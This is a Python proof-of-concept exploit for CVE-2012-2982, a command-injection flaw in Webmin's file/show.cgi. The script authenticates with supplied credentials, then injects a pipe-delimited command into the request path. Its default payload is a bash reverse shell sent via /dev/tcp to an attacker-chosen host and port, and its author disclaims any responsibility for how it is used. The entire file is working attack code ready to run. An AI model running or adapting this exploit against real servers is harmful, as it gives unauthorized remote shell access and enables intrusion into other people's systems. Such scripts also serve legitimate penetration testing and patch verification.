#!/usr/bin/env python

# A Python Exploit against CVE-2012-2982
# Author: Anurag Mondal (7Ragnarok7)
# Mail: 7Ragnarok7@pm.me
# Github: https://github.com/7Ragnarok7/PoC/blob/main/Python/webmin-2012-2982.py

# Description: file/show.cgi in Webmin 1.590 and earlier allows remote authenticated users to execute
# arbitrary commands via an invalid character in a pathname, as demonstrated by a | (pipe) character.
# Reference: https://nvd.nist.gov/vuln/detail/CVE-2012-2982

# Note: By default the payload is set to create a reverse shell from the victim but you can
# replace it with any payload of your choice.
# Disclaimer: I shall not be held responsible for whatsover you do with this tool.


import string
import requests
import random
from sys import argv

try: lhost, lport, target, user, passw = argv[1:]
except: exit('Usage: python webmin-2012-2982.py lhost lport rhost user pass')

payload = f'bash -c "bash -i &>/dev/tcp/{lhost}/{lport}<&1"'
url = f'http://{target}/session_login.cgi'
data = {'page': '/', 'user': user, 'pass': passw}
resp = requests.post(url, data=data, cookies={'testing': '1'}, verify=False, allow_redirects=False)

try: sid = resp.cookies["sid"]
except: sid = None
if resp.status_code == 302 and sid: print('\nAuthentication successful!!!\n')
else: exit('\nAuthentication Failed!!!\n')

alphanums = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(5)])
url = f'http://{target}/file/show.cgi/bin/{alphanums}|{payload}|'
print('Executing the payload...')
resp = requests.get(url, cookies={'sid': sid},verify=False, allow_redirects=False)

print(resp.text)

